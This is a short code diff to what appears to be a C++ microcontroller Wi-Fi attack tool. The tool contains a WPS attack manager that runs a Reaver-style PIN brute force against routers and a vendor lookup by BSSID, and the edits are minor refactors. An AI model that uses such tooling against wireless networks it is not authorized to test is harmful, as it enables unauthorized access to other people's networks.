@@ -15,6 +15,11 @@
 // Instância global
 WPSAttackManager wpsAttackManager;
 
+// Helper function for logging
+static void logOperation(const String& operation) {
+    Serial.println("[WPS] " + operation);
+}
+
 // ============================================================================
 // IMPLEMENTAÇÃO WPSSCANNER
 // ============================================================================
@@ -467,10 +472,10 @@ void WPSAttackManager::processAttacks() {
                 // Tenta próximo PIN
                 if (reaverAttacker.tryNextPIN()) {
                     // Verifica se PIN funcionou
-                    if (reaverAttacker.checkPINResult(reaverAttacker.currentPIN)) {
+                    if (reaverAttacker.checkPINResult(reaverAttacker.getCurrentPIN())) {
                         attacksSuccessful++;
                         if (onPinFound) {
-                            onPinFound(reaverAttacker.currentPIN, "REAVER_PASSWORD");
+                            onPinFound(reaverAttacker.getCurrentPIN(), "REAVER_PASSWORD");
                         }
                         updateState(WPS_SUCCESS);
                     }
@@ -560,7 +565,7 @@ String detectManufacturer(const uint8_t* bssid) {
         case 0x001A70: return "Ralink";
         case 0x001D8B: return "Ralink";
         case 0x0022B0: return "Ralink";
-        case 0x0023CD: return "TP-Link";
+        // case 0x0023CD: duplicate - already defined above
         case 0x0025A4: return "Ralink";
         case 0x0050C2: return "Ralink";
         case 0x14B968: return "Technicolor";
